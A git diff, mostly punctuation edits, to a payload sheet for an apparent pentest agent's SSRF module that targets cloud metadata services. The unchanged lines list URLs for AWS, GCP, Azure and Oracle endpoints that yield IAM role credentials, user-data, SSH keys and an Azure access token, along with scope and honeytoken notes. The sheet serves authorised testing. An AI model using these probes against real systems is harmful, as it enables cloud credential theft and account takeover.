@@ -1,4 +1,4 @@
-# payloads — ssrf-cloud-metadata-hunter
+# payloads - ssrf-cloud-metadata-hunter
 
 **Source:** `pentest-agent-development/notebooklm-notes/Guia Técnico_ Exploração de SSRF em Metadados de Nuvem.md` (Section 5: PAYLOADS / PROBES)
 
@@ -8,9 +8,9 @@ Instance Metadata Service (IMDS) of the hosting cloud provider.
 
 ---
 
-## 1. AWS — IMDSv1 (legacy, un-authenticated)
+## 1. AWS - IMDSv1 (legacy, un-authenticated)
 
-### Step 1 — Enumerate metadata tree
+### Step 1 - Enumerate metadata tree
 
 ```
 http://169.254.169.254/latest/meta-data/
@@ -19,7 +19,7 @@ http://169.254.169.254/latest/meta-data/
 Returns categories: `ami-id`, `hostname`, `iam/`, `instance-id`,
 `public-ipv4`, etc.
 
-### Step 2 — List IAM role name(s)
+### Step 2 - List IAM role name(s)
 
 ```
 http://169.254.169.254/latest/meta-data/iam/security-credentials/
@@ -27,7 +27,7 @@ http://169.254.169.254/latest/meta-data/iam/security-credentials/
 
 Returns one line per role attached to the instance.
 
-### Step 3 — Fetch temporary credentials
+### Step 3 - Fetch temporary credentials
 
 ```
 http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE_NAME>
@@ -51,19 +51,19 @@ These credentials are short-lived (minutes-hours) and scoped to the
 instance's IAM role. Handoff to `aws-iam-hunter` for permission
 enumeration.
 
-### Step 4 — Dynamic data (launch parameters, spot info)
+### Step 4 - Dynamic data (launch parameters, spot info)
 
 ```
 http://169.254.169.254/latest/dynamic/instance-identity/document
 http://169.254.169.254/latest/user-data
 ```
 
-`user-data` often contains the instance's bootstrap script — sometimes
+`user-data` often contains the instance's bootstrap script - sometimes
 with hardcoded credentials.
 
 ---
 
-## 2. AWS — IMDSv2 (Session-Token Required)
+## 2. AWS - IMDSv2 (Session-Token Required)
 
 IMDSv2 requires a PUT to fetch a session token, then GETs with that
 token. A pure SSRF that only supports GET cannot speak IMDSv2 at all.
@@ -96,7 +96,7 @@ When IMDSv2 enforcement is strict, report as hardened and stop.
 
 ---
 
-## 3. GCP — v1 (requires `Metadata-Flavor` header)
+## 3. GCP - v1 (requires `Metadata-Flavor` header)
 
 ```
 http://metadata.google.internal/computeMetadata/v1/
@@ -128,7 +128,7 @@ http://metadata.google.internal/computeMetadata/v1/instance/attributes/ssh-keys
 
 ---
 
-## 4. GCP — v1beta1 (legacy, NO header required)
+## 4. GCP - v1beta1 (legacy, NO header required)
 
 When the SSRF cannot inject headers, try the legacy endpoint:
 
@@ -142,7 +142,7 @@ gap by itself.
 
 ---
 
-## 5. Azure — IMDS (requires `Metadata: true` header)
+## 5. Azure - IMDS (requires `Metadata: true` header)
 
 ```
 http://169.254.169.254/metadata/instance?api-version=2021-02-01
@@ -160,12 +160,12 @@ Metadata: true
 http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F
 ```
 
-Returns an `access_token` for ARM — handoff to an Azure permission
+Returns an `access_token` for ARM - handoff to an Azure permission
 enumerator.
 
 ---
 
-## 6. Oracle Cloud (OCI) — IMDSv2
+## 6. Oracle Cloud (OCI) - IMDSv2
 
 ```
 http://169.254.169.254/opc/v2/instance/
@@ -244,8 +244,7 @@ aws iam simulate-principal-policy \
     --action-names s3:ListBuckets ec2:DescribeInstances
 ```
 
-All subsequent commands must honour the `cloud-readonly` profile —
-NO `create-*`, `update-*`, `delete-*`, `put-*`.
+All subsequent commands must honour the `cloud-readonly` profile - NO `create-*`, `update-*`, `delete-*`, `put-*`.
 
 ---
 
@@ -256,8 +255,8 @@ NO `create-*`, `update-*`, `delete-*`, `put-*`.
   AWS accounts outside scope.
 - IMDS responses that contain bogus credentials (`AccessKeyId=AKIAEXAMPLE`)
   may be honeytokens intentionally seeded by defenders. Using such
-  credentials is still logged — proceed with caution and expect detection.
+  credentials is still logged - proceed with caution and expect detection.
 - When IMDSv2 is enforced strictly and headers cannot be injected, the
   appropriate outcome is to report the SSRF (from `ssrf-hunter`) without
-  claiming credential theft — that finding still ranks at High because
+  claiming credential theft - that finding still ranks at High because
   of internal-network access.
